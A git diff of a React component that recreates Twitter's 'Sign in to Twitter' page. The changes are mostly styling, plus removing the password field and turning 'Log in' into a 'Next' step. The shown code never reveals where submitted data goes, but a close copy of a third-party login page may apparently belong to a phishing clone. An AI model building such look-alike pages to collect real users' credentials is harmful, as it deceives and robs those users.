@@ -34,15 +34,15 @@ const Twitter = () => {
 
   return (
     <div className="sm:bg-gray-100 bg-white flex-col gap-3 h-screen w-full flex justify-center items-center">
-      <div className="sm:w-[350px] w-full pt-[24px] sm:border border-gray-300 bg-white">
+      <div className="sm:w-[350px] w-full pt-[12px] sm:border border-gray-300 bg-white">
         <div className="w-90vw md:w-45vw flex flex-col items-center">
-          <div className="flex flex-col items-center justify-center p-4">
+          <div className="flex flex-col items-center justify-center p-4 pb-12">
             <img
               src={twitter}
               height=""
               width="40px"
               alt="Twitter logo"
-              className="mb-8"
+              className="mb-4"
             />
             <p className="text-[25px] font-bold">Sign in to Twitter</p>
           </div>
@@ -64,10 +64,10 @@ const Twitter = () => {
 
           <form
             onSubmit={handleSubmit}
-            className="sm:shadow-md w-full bg-white px-10 pb-5 pt-2  rounded-lg flex flex-col gap-3"
+            className=" w-full bg-white px-10 pb-5 pt-2  rounded-lg flex flex-col gap-3"
           >
             <input
-              className="w-full p-2 text-gray-700 text-sm bg-[#efefef] border border-gray-300 rounded"
+              className="w-full p-4 text-gray-700 text-sm bg-[#efefef] border border-gray-300 rounded focus:outline-none focus:border-blue-500"
               placeholder="Phone number, username, or email"
               type="text"
               name="username"
@@ -75,21 +75,12 @@ const Twitter = () => {
               onChange={handleLogin}
               required
             />
-            <input
-              className="w-full p-2 text-gray-700 text-sm bg-[#efefef] border border-gray-300 rounded"
-              type="password"
-              name="password"
-              value={formData.password}
-              onChange={handleLogin}
-              placeholder="Password"
-              required
-            />
 
             <button
               type="submit"
-              className="bg-[#47afff] py-1 rounded-lg font-bold w-full text-white"
+              className="bg-[#47afff] py-2 rounded-full bg-black font-bold w-full text-white"
             >
-              Log in
+              Next
             </button>
             {loading && (
               <p className="text-gray-700 text-sm font-medium">Loading...</p>
@@ -98,12 +89,12 @@ const Twitter = () => {
             <p className="text-blue-500 text-sm mx-auto">Forgotten password?</p>
           </form>
         </div>
-      </div>
-      <div className="w-[350px] py-[20px] text-[14px] sm:border border-gray-300 bg-white flex justify-center items-center">
-        <span className="">
-          Don't have an account?{" "}
-          <span className="text-[#0095f6] font-semibold">Sign up</span>
-        </span>
+        <div className="w-[350px] py-[20px] text-[14px] bg-white flex justify-center items-center">
+          <span className="">
+            Don't have an account?{" "}
+            <span className="text-[#0095f6] font-semibold">Sign up</span>
+          </span>
+        </div>
       </div>
     </div>
   );
